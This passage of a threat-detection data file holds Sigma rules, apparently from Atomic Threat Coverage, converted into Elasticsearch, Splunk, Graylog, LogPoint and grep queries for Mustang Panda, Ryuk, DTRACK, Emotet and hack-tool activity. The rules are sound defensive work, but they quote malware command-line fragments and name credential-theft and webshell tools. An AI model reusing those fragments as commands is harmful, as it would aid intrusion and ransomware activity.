AccessMask:\\\\\"262144\\\\\" AND ObjectType:(\\\\\"19195a5b\\\\\\\\-6da0\\\\\\\\-11d0\\\\\\\\-afd3\\\\\\\\-00c04fd930c9\\\\\" OR \\\\\"domainDNS\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4662\\\\\" AND ObjectServer:\\\\\"DS\\\\\" AND AccessMask:\\\\\"262144\\\\\" AND ObjectType:(\\\\\"19195a5b\\\\\\\\-6da0\\\\\\\\-11d0\\\\\\\\-afd3\\\\\\\\-00c04fd930c9\\\\\" OR \\\\\"domainDNS\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1000 AD Object WriteDAC Access\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4662\" AND ObjectServer:\"DS\" AND AccessMask:\"262144\" AND ObjectType:(\"19195a5b\\\\-6da0\\\\-11d0\\\\-afd3\\\\-00c04fd930c9\" \"domainDNS\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4662\" ObjectServer=\"DS\" AccessMask=\"262144\" (ObjectType=\"19195a5b-6da0-11d0-afd3-00c04fd930c9\" OR ObjectType=\"domainDNS\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4662\" ObjectServer=\"DS\" AccessMask=\"262144\" ObjectType IN [\"19195a5b-6da0-11d0-afd3-00c04fd930c9\", \"domainDNS\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4662)(?=.*DS)(?=.*262144)(?=.*(?:.*19195a5b-6da0-11d0-afd3-00c04fd930c9|.*domainDNS)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Mustang Panda Dropper\nid: 2d87d610-d760-45ee-a7e6-7a6f2a65de00\nstatus: experimental\ndescription: Detects specific process parameters as used by Mustang Panda droppers\nauthor: Florian Roth\ndate: 2019/10/30\nreferences:\n    - https://app.any.run/tasks/7ca5661d-a67b-43ec-98c1-dd7a8103c256/\n    - https://app.any.run/tasks/b12cccf3-1c22-4e28-9d3e-c7a6062f3914/\n    - https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine: \n            - '*Temp\\wtask.exe /create*'\n            - '*%windir:~-3,1%%PUBLIC:~-9,1%*'\n            - '*/E:vbscript * C:\\Users\\*.txt\" /F'\n            - '*/tn \"Security Script *'\n            - '*%windir:~-1,1%*'\n    selection2:\n        Image:\n            - '*Temp\\winwsh.exe'\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:(*Temp\\\\\\\\wtask.exe\\\\ \\\\/create* OR *%windir\\\\:\\\\~\\\\-3,1%%PUBLIC\\\\:\\\\~\\\\-9,1%* OR *\\\\/E\\\\:vbscript\\\\ *\\\\ C\\\\:\\\\\\\\Users\\\\*.txt\\\\\"\\\\ \\\\/F OR *\\\\/tn\\\\ \\\\\"Security\\\\ Script\\\\ * OR *%windir\\\\:\\\\~\\\\-1,1%*) OR Image.keyword:(*Temp\\\\\\\\winwsh.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Mustang-Panda-Dropper <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Mustang Panda Dropper\",\\n    \"description\": \"Detects specific process parameters as used by Mustang Panda droppers\",\\n    \"tags\": \"\",\\n    \"query\": \"(CommandLine.keyword:(*Temp\\\\\\\\\\\\\\\\wtask.exe\\\\\\\\ \\\\\\\\/create* OR *%windir\\\\\\\\:\\\\\\\\~\\\\\\\\-3,1%%PUBLIC\\\\\\\\:\\\\\\\\~\\\\\\\\-9,1%* OR *\\\\\\\\/E\\\\\\\\:vbscript\\\\\\\\ *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\*.txt\\\\\\\\\\\\\"\\\\\\\\ \\\\\\\\/F OR *\\\\\\\\/tn\\\\\\\\ \\\\\\\\\\\\\"Security\\\\\\\\ Script\\\\\\\\ * OR *%windir\\\\\\\\:\\\\\\\\~\\\\\\\\-1,1%*) OR Image.keyword:(*Temp\\\\\\\\\\\\\\\\winwsh.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:(*Temp\\\\\\\\\\\\\\\\wtask.exe\\\\\\\\ \\\\\\\\/create* OR *%windir\\\\\\\\:\\\\\\\\~\\\\\\\\-3,1%%PUBLIC\\\\\\\\:\\\\\\\\~\\\\\\\\-9,1%* OR *\\\\\\\\/E\\\\\\\\:vbscript\\\\\\\\ *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\*.txt\\\\\\\\\\\\\"\\\\\\\\ \\\\\\\\/F OR *\\\\\\\\/tn\\\\\\\\ \\\\\\\\\\\\\"Security\\\\\\\\ Script\\\\\\\\ * OR *%windir\\\\\\\\:\\\\\\\\~\\\\\\\\-1,1%*) OR Image.keyword:(*Temp\\\\\\\\\\\\\\\\winwsh.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Mustang Panda Dropper\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:(*Temp\\\\\\\\wtask.exe \\\\/create* *%windir\\\\:\\\\~\\\\-3,1%%PUBLIC\\\\:\\\\~\\\\-9,1%* *\\\\/E\\\\:vbscript * C\\\\:\\\\\\\\Users\\\\*.txt\\\\\" \\\\/F *\\\\/tn \\\\\"Security Script * *%windir\\\\:\\\\~\\\\-1,1%*) OR Image.keyword:(*Temp\\\\\\\\winwsh.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((CommandLine=\"*Temp\\\\\\\\wtask.exe /create*\" OR CommandLine=\"*%windir:~-3,1%%PUBLIC:~-9,1%*\" OR CommandLine=\"*/E:vbscript * C:\\\\\\\\Users\\\\*.txt\\\\\" /F\" OR CommandLine=\"*/tn \\\\\"Security Script *\" OR CommandLine=\"*%windir:~-1,1%*\") OR (Image=\"*Temp\\\\\\\\winwsh.exe\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (CommandLine IN [\"*Temp\\\\\\\\wtask.exe /create*\", \"*%windir:~-3,1%%PUBLIC:~-9,1%*\", \"*/E:vbscript * C:\\\\\\\\Users\\\\*.txt\\\\\" /F\", \"*/tn \\\\\"Security Script *\", \"*%windir:~-1,1%*\"] OR Image IN [\"*Temp\\\\\\\\winwsh.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*(?:.*(?:.*.*Temp\\\\wtask\\\\.exe /create.*|.*.*%windir:~-3,1%%PUBLIC:~-9,1%.*|.*.*/E:vbscript .* C:\\\\Users\\\\.*\\\\.txt\" /F|.*.*/tn \"Security Script .*|.*.*%windir:~-1,1%.*)|.*(?:.*.*Temp\\\\winwsh\\\\.exe)))\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Relevant Anti-Virus Event\nid: 78bc5783-81d9-4d73-ac97-59f6db4f72a8\ndescription: This detection method points out highly relevant Antivirus events\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: application\ndetection:\n    keywords:\n        Message:\n            - \"*HTool*\"\n            - \"*Hacktool*\"\n            - \"*ASP/Backdoor*\"\n            - \"*JSP/Backdoor*\"\n            - \"*PHP/Backdoor*\"\n            - \"*Backdoor.ASP*\"\n            - \"*Backdoor.JSP*\"\n            - \"*Backdoor.PHP*\"\n            - \"*Webshell*\"\n            - \"*Portscan*\"\n            - \"*Mimikatz*\"\n            - \"*WinCred*\"\n            - \"*PlugX*\"\n            - \"*Korplug*\"\n            - \"*Pwdump*\"\n            - \"*Chopper*\"\n            - \"*WmiExec*\"\n            - \"*Xscan*\"\n            - \"*Clearlog*\"\n            - \"*ASPXSpy*\"\n    filters:\n        Message:\n            - \"*Keygen*\"\n            - \"*Crack*\"\n    condition: keywords and not 1 of filters\nfalsepositives:\n    - Some software piracy tools (key generators, cracks) are classified as hack tools\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Message.keyword:(*HTool* OR *Hacktool* OR *ASP\\\\/Backdoor* OR *JSP\\\\/Backdoor* OR *PHP\\\\/Backdoor* OR *Backdoor.ASP* OR *Backdoor.JSP* OR *Backdoor.PHP* OR *Webshell* OR *Portscan* OR *Mimikatz* OR *WinCred* OR *PlugX* OR *Korplug* OR *Pwdump* OR *Chopper* OR *WmiExec* OR *Xscan* OR *Clearlog* OR *ASPXSpy*) AND (NOT (Message.keyword:(*Keygen* OR *Crack*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Relevant-Anti-Virus-Event <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Relevant Anti-Virus Event\",\\n    \"description\": \"This detection method points out highly relevant Antivirus events\",\\n    \"tags\": \"\",\\n    \"query\": \"(Message.keyword:(*HTool* OR *Hacktool* OR *ASP\\\\\\\\/Backdoor* OR *JSP\\\\\\\\/Backdoor* OR *PHP\\\\\\\\/Backdoor* OR *Backdoor.ASP* OR *Backdoor.JSP* OR *Backdoor.PHP* OR *Webshell* OR *Portscan* OR *Mimikatz* OR *WinCred* OR *PlugX* OR *Korplug* OR *Pwdump* OR *Chopper* OR *WmiExec* OR *Xscan* OR *Clearlog* OR *ASPXSpy*) AND (NOT (Message.keyword:(*Keygen* OR *Crack*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Message.keyword:(*HTool* OR *Hacktool* OR *ASP\\\\\\\\/Backdoor* OR *JSP\\\\\\\\/Backdoor* OR *PHP\\\\\\\\/Backdoor* OR *Backdoor.ASP* OR *Backdoor.JSP* OR *Backdoor.PHP* OR *Webshell* OR *Portscan* OR *Mimikatz* OR *WinCred* OR *PlugX* OR *Korplug* OR *Pwdump* OR *Chopper* OR *WmiExec* OR *Xscan* OR *Clearlog* OR *ASPXSpy*) AND (NOT (Message.keyword:(*Keygen* OR *Crack*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Relevant Anti-Virus Event\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Message.keyword:(*HTool* *Hacktool* *ASP\\\\/Backdoor* *JSP\\\\/Backdoor* *PHP\\\\/Backdoor* *Backdoor.ASP* *Backdoor.JSP* *Backdoor.PHP* *Webshell* *Portscan* *Mimikatz* *WinCred* *PlugX* *Korplug* *Pwdump* *Chopper* *WmiExec* *Xscan* *Clearlog* *ASPXSpy*) AND (NOT (Message.keyword:(*Keygen* *Crack*))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Message=\"*HTool*\" OR Message=\"*Hacktool*\" OR Message=\"*ASP/Backdoor*\" OR Message=\"*JSP/Backdoor*\" OR Message=\"*PHP/Backdoor*\" OR Message=\"*Backdoor.ASP*\" OR Message=\"*Backdoor.JSP*\" OR Message=\"*Backdoor.PHP*\" OR Message=\"*Webshell*\" OR Message=\"*Portscan*\" OR Message=\"*Mimikatz*\" OR Message=\"*WinCred*\" OR Message=\"*PlugX*\" OR Message=\"*Korplug*\" OR Message=\"*Pwdump*\" OR Message=\"*Chopper*\" OR Message=\"*WmiExec*\" OR Message=\"*Xscan*\" OR Message=\"*Clearlog*\" OR Message=\"*ASPXSpy*\") NOT ((Message=\"*Keygen*\" OR Message=\"*Crack*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(Message IN [\"*HTool*\", \"*Hacktool*\", \"*ASP/Backdoor*\", \"*JSP/Backdoor*\", \"*PHP/Backdoor*\", \"*Backdoor.ASP*\", \"*Backdoor.JSP*\", \"*Backdoor.PHP*\", \"*Webshell*\", \"*Portscan*\", \"*Mimikatz*\", \"*WinCred*\", \"*PlugX*\", \"*Korplug*\", \"*Pwdump*\", \"*Chopper*\", \"*WmiExec*\", \"*Xscan*\", \"*Clearlog*\", \"*ASPXSpy*\"]  -(Message IN [\"*Keygen*\", \"*Crack*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*HTool.*|.*.*Hacktool.*|.*.*ASP/Backdoor.*|.*.*JSP/Backdoor.*|.*.*PHP/Backdoor.*|.*.*Backdoor\\\\.ASP.*|.*.*Backdoor\\\\.JSP.*|.*.*Backdoor\\\\.PHP.*|.*.*Webshell.*|.*.*Portscan.*|.*.*Mimikatz.*|.*.*WinCred.*|.*.*PlugX.*|.*.*Korplug.*|.*.*Pwdump.*|.*.*Chopper.*|.*.*WmiExec.*|.*.*Xscan.*|.*.*Clearlog.*|.*.*ASPXSpy.*))(?=.*(?!.*(?:.*(?=.*(?:.*.*Keygen.*|.*.*Crack.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Ryuk Ransomware\nid: 0acaad27-9f02-4136-a243-c357202edd74\ndescription: Detects Ryuk Ransomware command lines\nstatus: experimental\nreferences:\n    - https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/\nauthor: Vasiliy Burov\ndate: 2019/08/06\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\net.exe stop \"samss\" *'\n            - '*\\net.exe stop \"audioendpointbuilder\" *'\n            - '*\\net.exe stop \"unistoresvc_?????\" *'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\net.exe\\\\ stop\\\\ \\\\\"samss\\\\\"\\\\ * OR *\\\\\\\\net.exe\\\\ stop\\\\ \\\\\"audioendpointbuilder\\\\\"\\\\ * OR *\\\\\\\\net.exe\\\\ stop\\\\ \\\\\"unistoresvc_?????\\\\\"\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Ryuk-Ransomware <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Ryuk Ransomware\",\\n    \"description\": \"Detects Ryuk Ransomware command lines\",\\n    \"tags\": \"\",\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\net.exe\\\\\\\\ stop\\\\\\\\ \\\\\\\\\\\\\"samss\\\\\\\\\\\\\"\\\\\\\\ * OR *\\\\\\\\\\\\\\\\net.exe\\\\\\\\ stop\\\\\\\\ \\\\\\\\\\\\\"audioendpointbuilder\\\\\\\\\\\\\"\\\\\\\\ * OR *\\\\\\\\\\\\\\\\net.exe\\\\\\\\ stop\\\\\\\\ \\\\\\\\\\\\\"unistoresvc_?????\\\\\\\\\\\\\"\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\net.exe\\\\\\\\ stop\\\\\\\\ \\\\\\\\\\\\\"samss\\\\\\\\\\\\\"\\\\\\\\ * OR *\\\\\\\\\\\\\\\\net.exe\\\\\\\\ stop\\\\\\\\ \\\\\\\\\\\\\"audioendpointbuilder\\\\\\\\\\\\\"\\\\\\\\ * OR *\\\\\\\\\\\\\\\\net.exe\\\\\\\\ stop\\\\\\\\ \\\\\\\\\\\\\"unistoresvc_?????\\\\\\\\\\\\\"\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Ryuk Ransomware\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\net.exe stop \\\\\"samss\\\\\" * *\\\\\\\\net.exe stop \\\\\"audioendpointbuilder\\\\\" * *\\\\\\\\net.exe stop \\\\\"unistoresvc_?????\\\\\" *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\net.exe stop \\\\\"samss\\\\\" *\" OR CommandLine=\"*\\\\\\\\net.exe stop \\\\\"audioendpointbuilder\\\\\" *\" OR CommandLine=\"*\\\\\\\\net.exe stop \\\\\"unistoresvc_?????\\\\\" *\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\net.exe stop \\\\\"samss\\\\\" *\", \"*\\\\\\\\net.exe stop \\\\\"audioendpointbuilder\\\\\" *\", \"*\\\\\\\\net.exe stop \\\\\"unistoresvc_?????\\\\\" *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*.*\\\\net\\\\.exe stop \"samss\" .*|.*.*\\\\net\\\\.exe stop \"audioendpointbuilder\" .*|.*.*\\\\net\\\\.exe stop \"unistoresvc_?????\" .*)\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: DTRACK Process Creation\nid: f1531fa4-5b84-4342-8f68-9cf3fdbd83d4\nstatus: experimental\ndescription: Detects specific process parameters as seen in DTRACK infections\nauthor: Florian Roth\ndate: 2019/10/30\nreferences:\n    - https://securelist.com/my-name-is-dtrack/93338/\n    - https://app.any.run/tasks/4bc9860d-ab51-4077-9e09-59ad346b92fd/\n    - https://app.any.run/tasks/ce4deab5-3263-494f-93e3-afb2b9d79f14/\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '* echo EEEE > *'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:*\\\\ echo\\\\ EEEE\\\\ \\\\ *", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DTRACK-Process-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DTRACK Process Creation\",\\n    \"description\": \"Detects specific process parameters as seen in DTRACK infections\",\\n    \"tags\": \"\",\\n    \"query\": \"CommandLine.keyword:*\\\\\\\\ echo\\\\\\\\ EEEE\\\\\\\\ \\\\\\\\ *\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*\\\\\\\\ echo\\\\\\\\ EEEE\\\\\\\\ \\\\\\\\ *\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DTRACK Process Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:* echo EEEE  *", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "CommandLine=\"* echo EEEE > *\" | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"* echo EEEE > *\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.* echo EEEE > .*'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Emotet Process Creation\nid: d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18\nstatus: experimental\ndescription: Detects all Emotet like process executions that are not covered by the more generic rules\nauthor: Florian Roth\ndate: 2019/09/30\nmodified: 2019/10/16\nreferences:\n    - https://app.any.run/tasks/e13ab713-64cf-4b23-ad93-6dceaa5429ac/\n    - https://app.any.run/tasks/81f3c28c-c686-425d-8a2b-a98198d244e1/\n    - https://app.any.run/tasks/97f875e8-0e08-4328-815f-055e971ba754/\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -e* PAA*'\n            - '*JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ*'  # $env:userprofile\n            - '*QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA*'  # $env:userprofile\n            - '*kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA*'  # $env:userprofile\n            - '*IgAoACcAKgAnACkAOwAkA*'  # \"('*');$\n            - '*IAKAAnACoAJwApADsAJA*'  # \"('*');$\n            - '*iACgAJwAqACcAKQA7ACQA*'  # \"('*');$\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ \\\\-e*\\\\ PAA* OR *JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ* OR *QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA* OR *kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA* OR *IgAoACcAKgAnACkAOwAkA* OR *IAKAAnACoAJwApADsAJA* OR *iACgAJwAqACcAKQA7ACQA*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Emotet-Process-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Emotet Process Creation\",\\n    \"description\": \"Detects all Emotet like process executions that are not covered by the more generic rules\",\\n    \"tags\": \"\",\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-e*\\\\\\\\ PAA* OR *JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ* OR *QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA* OR *kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA* OR *IgAoACcAKgAnACkAOwAkA* OR *IAKAAnACoAJwApADsAJA* OR *iACgAJwAqACcAKQA7ACQA*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-e*\\\\\\\\ PAA* OR *JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ* OR *QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA* OR *kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA* OR *IgAoACcAKgAnACkAOwAkA* OR *IAKAAnACoAJwApADsAJA* OR *iACgAJwAqACcAKQA7ACQA*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Emotet Process Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    